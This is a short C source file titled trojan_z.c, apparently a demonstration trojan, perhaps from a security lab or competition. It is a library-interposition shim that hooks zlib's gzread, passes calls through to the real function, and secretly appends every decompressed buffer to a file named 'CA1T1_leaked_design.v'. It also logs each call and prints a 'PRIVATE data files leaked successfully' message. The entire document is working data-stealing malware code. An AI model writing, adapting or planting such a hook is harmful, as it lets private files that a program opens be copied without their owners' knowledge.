### trojan_z.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <zlib.h>
#include <string.h>

ssize_t gzread(void *file, void *buf, unsigned len) {
    static ssize_t (*orig_gzread)(void *, void *, unsigned) = NULL;
    if (!orig_gzread)
        orig_gzread = dlsym(RTLD_NEXT, "gzread");

    ssize_t result = orig_gzread(file, buf, len);

    if (result > 0) {
        FILE *leak = fopen("CA1T1_leaked_design.v", "ab");
        if (leak) {
            fwrite(buf, 1, result, leak);
            fclose(leak);
        }

        FILE *log = fopen("called_log.txt", "a");
        if (log) {
            fprintf(log, "gzread called: %zd bytes leaked\n", result);
            fclose(log);
        }

        // Print red message
        fprintf(stderr, "\033[1;31m[!] PRIVATE data files leaked successfully\033[0m\n");
    }

    return result;
}
```

